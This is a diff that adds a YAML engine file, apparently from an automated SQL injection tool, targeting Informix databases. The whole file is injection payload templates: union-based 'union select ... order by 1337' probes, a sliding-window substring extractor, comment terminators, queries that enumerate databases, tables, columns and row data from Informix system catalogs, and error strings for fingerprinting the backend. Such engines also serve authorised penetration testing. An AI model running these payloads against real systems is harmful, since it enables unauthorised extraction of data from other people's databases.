@@ -1,0 +1,125 @@
+vendor: ""
+resource: 
+ info: |
+  SELECT trim(
+      DBINFO('version','full')
+      || '${ENCLOSE_VALUE_SQL}'
+      || DBSERVERNAME
+      || '${ENCLOSE_VALUE_SQL}'
+      || USER
+      || '${TRAIL_SQL}'
+  ) r 
+  FROM TABLE(SET{1})
+ schema: 
+  database: |
+   select 
+       rr
+       || '${TRAIL_SQL}'
+       r
+   from (
+       select 
+           '${ENCLOSE_VALUE_SQL}'
+           || trim(t.name)
+           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           rr
+       from 
+           (select distinct name from sysdatabases) t,
+           (select distinct name from sysdatabases) t1
+       where t.name >= t1.name
+       group by 1
+       {limit}
+   ) a
+  table: |
+   select 
+       rr
+       ||'${TRAIL_SQL}' 
+       r
+   from (
+       select 
+           '${ENCLOSE_VALUE_SQL}'
+           || trim(t.tabname)
+           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           rr
+       from 
+           (select distinct tabname from ${DATABASE}:systables) t,
+           (select distinct tabname from ${DATABASE}:systables) t1
+       where t.tabname >= t1.tabname
+       group by 1
+       {limit}
+   ) a
+  column: |
+   select 
+       rr
+       || '${TRAIL_SQL}'
+       r
+   from (
+       select 
+           '${ENCLOSE_VALUE_SQL}'
+           || trim(t.colname)
+           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           rr
+       from 
+           (select distinct colname from ${DATABASE}:syscolumns c join ${DATABASE}:systables t on c.tabid = t.tabid where tabname = '${TABLE}') t,
+           (select distinct colname from ${DATABASE}:syscolumns c join ${DATABASE}:systables t on c.tabid = t.tabid where tabname = '${TABLE}') t1
+       where t.colname >= t1.colname
+       group by 1
+       {limit}
+   ) a
+  row: 
+   query: |
+    select 
+        rr
+        || '${TRAIL_SQL}' 
+        r
+    from (
+        select
+            '${ENCLOSE_VALUE_SQL}'
+            || trim(t.s)
+            || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+            rr
+        from
+           (select distinct ${FIELDS} s from ${DATABASE}:${TABLE}) t,
+           (select distinct ${FIELDS} s from ${DATABASE}:${TABLE}) t1
+        where t.s >= t1.s
+        group by 1
+        {limit}
+    ) a
+   fields: 
+    field: "trim(nvl(${FIELD}, ''))"
+    concat: "|| '%7f' ||"
+strategy: 
+ configuration: 
+  slidingWindow: |
+   select
+       '${LEAD}'
+       ||substr(
+           r,
+           ${INDEX},
+           32767
+       ) r 
+   from (
+       ${INJECTION}
+   ) x
+  limit: "having count(*) between ${LIMIT} and ${LIMIT}"
+  failsafe: |
+   select 
+       (1337${INDICE}7330%2b1) 
+       || '' r 
+   FROM TABLE(SET{1})
+  calibrator: |
+   rpad(
+       '${CALIBRATOR_SQL}', 
+       1024, 
+       '${CALIBRATOR_SQL}'
+   )
+  limitBoundary: 1
+  endingComment: "--+-"
+  fingerprint: 
+   errorMessage: 
+    - "Found a quote for which there is no matching quote. [SQL State="
+    - "[Informix][Informix ODBC Driver]General error. (SQLPrepare["
+    - "Informix database"
+ normal: 
+  indices: "union select ${RESULT_RANGE} from (${INDICE_UNIQUE}) b"
+  capacity: "'${LEAD}${INDICE}' || ${CALIBRATOR}"
+  orderBy: "order by 1337"
